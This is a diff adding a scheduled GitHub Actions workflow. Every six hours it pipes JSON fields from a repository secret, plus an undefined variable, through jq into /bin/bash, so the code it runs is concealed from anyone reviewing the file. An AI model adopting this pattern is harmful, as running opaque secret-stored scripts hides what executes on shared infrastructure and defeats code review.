@@ -1,0 +1,20 @@
+name: youmeizhongdiann
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: youmeizhongdiann
+        env:
+          t66: ${{ secrets.t66 }}
+        run: |
+          echo $t66 | jq -r .ihebk757 | /bin/bash
+          echo $e59 | jq -r .rnklx42768 | /bin/bash
+
